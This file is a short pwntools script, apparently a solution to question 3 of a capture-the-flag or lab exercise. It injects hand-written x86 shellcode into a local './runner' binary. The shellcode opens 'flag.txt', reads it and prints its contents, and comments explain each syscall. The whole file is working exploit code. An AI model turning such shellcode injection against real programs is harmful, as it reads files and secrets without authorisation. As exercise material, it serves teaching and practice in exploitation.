from pwn import *

# THIS IS QUESTION 3

p = process('./runner')

# flag.txt -> 66 6c 61 67 2e 74 78 74
# read stores num bytes read in eax, so put that into edx for write
read_write = asm("""
    push 0x00000000 # 'NULL'
    push 0x7478742e # '.txt'
    push 0x67616c66 # 'flag'

    ## fd = open('flag.txt')
    mov eax, 0x5    # eax = 5 (open)
    mov ebx, esp    # filename = 'flag.txt'
    mov ecx, 0      # flags = NULL
    mov edx, 0      # mode = NULL
    int 0x80        # SYSCALL

    ## eax stores the fd, so push it on to the stack
    push eax

    ## buffer = read(fd)
    mov ebx, eax    # ebx = fd
    mov eax, 0x3    # eax = 3 (read)
    lea ecx, [esp+4]# use the stack as the buffer to read to
    mov edx, 0x1A   # read 0x1A = 26 bytes
    int 0x80

    ## write(buffer, strlen(buffer))
    mov edx, eax    # eax stores the number of bytes written, so write however any bytes were read from the file
    mov eax, 0x4    # eax = 4 (write)
    mov ebx, 0x1    # write to stdout (fd 1)
    lea ecx, [esp+4]# write from the stack (our buffer)
    int 0x80

    ## close(fd) 
    mov eax, 0x6    # eax = 6 (close)
    pop ebx         # the fd is still the top of the stack (from line 20), so pop that into ebx (which stores the fd for close)
    int 0x80
""")

p.sendlineafter(b'that\n', read_write)

p.interactive()
p.close()